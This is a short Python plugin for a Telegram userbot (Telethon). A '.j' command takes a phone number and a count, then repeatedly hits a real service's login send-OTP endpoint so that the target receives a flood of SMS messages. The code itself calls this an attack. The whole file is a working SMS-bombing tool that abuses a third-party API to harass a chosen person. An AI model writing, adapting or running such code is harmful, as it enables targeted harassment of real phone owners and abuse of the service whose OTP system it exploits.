from telethon import events
import requests
from time import sleep


@events.register(events.NewMessage(outgoing=True, pattern=r"\.j"))
async def runj(event):
    await event.edit("Getting Started...")
    sleep(2)
    await event.delete()
    messagelocation = event.to_id
    try:
        gettargetdata = event.message.raw_text.split()
        targetphonenumber = gettargetdata[1]
        smsamount = gettargetdata[2]
        countsentsms = 0
        while countsentsms < int(smsamount):
            url = f"https://stage.bioscopelive.com/en/login/send-otp?phone=88{targetphonenumber}&operator=bd-otp"
            sendrequest = requests.get(url)
            maindata = sendrequest.json()
            if maindata["code"] == "200":
                countsentsms += 1
                await event.client.send_message(
                    messagelocation,
                    f"Successfully {countsentsms} SMS Sent To {targetphonenumber}",
                )
                sleep(30)
            else:
                await event.client.send_message(
                    messagelocation, "Message Not Sent"
                )
        await event.client.send_message(messagelocation, "The Attack Is Over")
    except IndexError:
        await event.client.send_message(messagelocation, "Select An Option")
    except:
        await event.client.send_message(
            messagelocation, "Something Went Wrong"
        )
